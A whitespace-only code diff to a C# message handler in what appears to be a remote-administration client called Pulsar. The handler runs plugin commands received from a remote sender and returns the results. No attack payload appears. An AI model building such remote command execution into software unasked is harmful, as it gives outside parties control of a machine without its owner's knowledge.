@@ -68,6 +68,7 @@ namespace Pulsar.Client.Messages
 		private void HandleExecuteUniversalCommand(ISender sender, DoExecuteUniversalCommand msg)
 		{
 			var result = UniversalPluginDispatcher.ExecuteCommand(msg.PluginId, msg.Command, msg.Parameters);
+			
 			var resultType = result.GetType();
 			var successProperty = resultType.GetProperty("Success");
 			var messageProperty = resultType.GetProperty("Message");
@@ -80,7 +81,7 @@ namespace Pulsar.Client.Messages
 			byte[] data = dataProperty != null ? (byte[])dataProperty.GetValue(result) : null;
 			bool shouldUnload = shouldUnloadProperty != null ? (bool)shouldUnloadProperty.GetValue(result) : false;
 			string nextCommand = nextCommandProperty != null ? (string)nextCommandProperty.GetValue(result) : null;
-
+			
 			sender.Send(new DoUniversalPluginResponse
 			{
 				PluginId = msg.PluginId,
